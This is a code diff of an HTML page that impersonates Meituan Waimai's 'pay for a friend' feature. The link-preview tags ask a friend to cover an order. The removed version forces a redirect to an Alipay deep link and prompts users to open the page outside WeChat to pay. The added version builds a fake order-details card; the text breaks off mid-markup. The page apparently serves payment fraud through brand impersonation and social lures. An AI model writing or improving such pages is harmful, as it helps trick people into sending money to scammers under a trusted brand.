@@ -1,68 +1,136 @@
 <!doctype html>
 <html lang="zh-CN">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>美团外卖 | 交易保障</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>美团外卖 | 为好友买单</title>
 
-    <meta property="og:title" content="美团外卖 | 交易保障" />
-    <meta property="og:description" content="Hi, 你和我的距离只差一顿外卖~ 请帮我支付这笔订单。" />
-    
-    <meta property="og:image" content="https://i.ibb.co/zzVqM3z/IMG-1830.png" />
-    
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            background: #ffffff;
-            margin: 0;
-            text-align: center;
-        }
-        .loading {
-            text-align: center;
-            color: #333333;
-            font-size: 18px;
-            font-weight: 500;
-            padding: 20px;
-        }
-        .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #ffd000; /* 美团黄 */
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
+  <meta property="og:title" content="美团外卖 | 外卖美食奶茶..." />
+  <meta property="og:description" content="交易保障｜你好，我和你的距离只差一顿外卖~ 来帮我代付吧~" />
+  <meta property="og:image" content="https://i.ibb.co/n9FPGnj/IMG-1830.png" />
+  <meta property="og:type" content="website" />
+
+  <style>
+    :root{
+      --bg:#f5f5f5;
+      --card:#fff;
+      --text:#111;
+      --muted:#888;
+      --yellow:#ffd000;
+      --yellow-dark:#ffbf00;
+      --border:#ececec;
+      --shadow:0 8px 24px rgba(0,0,0,.06);
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0;
+      font-family:Arial,"PingFang SC","Microsoft YaHei",sans-serif;
+      background:var(--bg);
+      color:var(--text);
+    }
+    .wrap{max-width:720px;margin:0 auto;padding:14px}
+    .hero{
+      background:linear-gradient(135deg,#111,#2b2b2b);
+      color:#fff;
+      border-radius:22px;
+      padding:18px;
+      box-shadow:var(--shadow);
+      margin-top:10px;
+    }
+    .hero h1{margin:0 0 6px;font-size:22px}
+    .hero p{margin:0;color:#ddd;font-size:14px;line-height:1.6}
+    .card{
+      background:var(--card);
+      border:1px solid var(--border);
+      border-radius:18px;
+      box-shadow:var(--shadow);
+      padding:14px;
+      margin-top:12px;
+    }
+    .title{font-weight:800;font-size:16px;margin-bottom:10px}
+    .row{
+      display:flex;justify-content:space-between;gap:10px;align-items:flex-start;
+    }
+    .muted{color:var(--muted);font-size:13px}
+    .item{
+      display:flex;justify-content:space-between;gap:10px;
+      padding:10px 0;border-top:1px solid #f0f0f0;
+    }
+    .item:first-child{border-top:0}
+    .name{font-weight:700}
+    .right{text-align:right;white-space:nowrap}
+    .total{
+      display:flex;justify-content:space-between;align-items:center;
+      margin-top:10px;padding-top:12px;border-top:1px solid #f0f0f0;
+      font-size:16px;font-weight:800;
+    }
+    .btn{
+      width:100%;
+      margin-top:14px;
+      border:0;
+      border-radius:16px;
+      padding:14px 16px;
+      font-size:16px;
+      font-weight:800;
+      cursor:pointer;
+    }
+    .btn-pay{background:linear-gradient(135deg,var(--yellow),var(--yellow-dark));color:#111}
+    .btn-pay:active{transform:scale(.99)}
+    .btn-copy{background:#fff;border:1px solid #ddd;color:#111}
+    .loading{
+      text-align:center;
+      padding:30px 0;
+      color:#444;
+    }
+    .spinner{
+      width:28px;height:28px;border-radius:50%;
+      border:4px solid #eee;border-top-color:var(--yellow);
+      animation:spin 1s linear infinite;
+      margin:0 auto 10px;
+    }
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .error{
+      color:#c00;
+      background:#fff0f0;
+      border:1px solid #ffd6d6;
+      padding:12px;
+      border-radius:14px;
+      margin-top:12px;
+    }
+    .hint{
+      margin-top:10px;
+      text-align:center;
+      color:#666;
+      font-size:13px;
+      line-height:1.6;
+    }
+    .box{
+      background:#fafafa;
+      border:1px dashed #e5e5e5;
+      border-radius:16px;
+      padding:12px;
+      margin-top:10px;
+    }
+  </style>
 </head>
 <body>
-    <div class="loading">
-        <div class="spinner"></div>
-        <div>正在为你跳转到支付宝支付...</div>
+  <div class="wrap">
+    <div class="hero">
+      <h1>美团外卖</h1>
+      <p>交易保障｜你好，我和你的距离只差一顿外卖~ 来帮我代付吧~</p>
     </div>
 
-    <script>
-        // 当用户点击卡片进入这个页面时，自动触发跳转逻辑
-        window.onload = function() {
-            // 尝试直接跳转支付宝唤醒协议 (alipays://...)
-            // 这是一个 deeplink，浏览器如果安装了支付宝 App 会尝试打开它
-            window.location.href = "alipays://platformapi/startapp?saId=10000007";
-            
-            // 如果跳转失败（例如在微信内置浏览器中，微信会拦截 alipays 协议），
-            // 脚本会继续执行下面的代码。我们在 1.5 秒后提示用户手动操作。
-            setTimeout(() => {
-                // 这是一个标准做法，因为微信生态的限制，无法强制静默跳转
-                alert("🎉 正在尝试打开支付宝完成代付！\n\n如果未自动跳转，请点击页面右上角三个点 (⋯)，选择“在浏览器中打开”，即可完成支付。");
-            }, 1500); // 延迟 1.5 秒弹出提示，给跳转留出时间
-        }
-    </script>
-</body>
-</html>
+    <div id="loading" class="card loading">
+      <div class="spinner"></div>
+      正在加载订单详情...
+    </div>
+
+    <div id="orderBox" style="display:none;">
+      <div class="card">
+        <div class="title">订单信息</div>
+        <div class="row">
+          <div>
+            <div><b id="storeName">商家</b></div>
+            <div class="muted">订单号：<span id="orderId">-</span></div>
+          </div>
+          <div class="muted" id="orderSt...
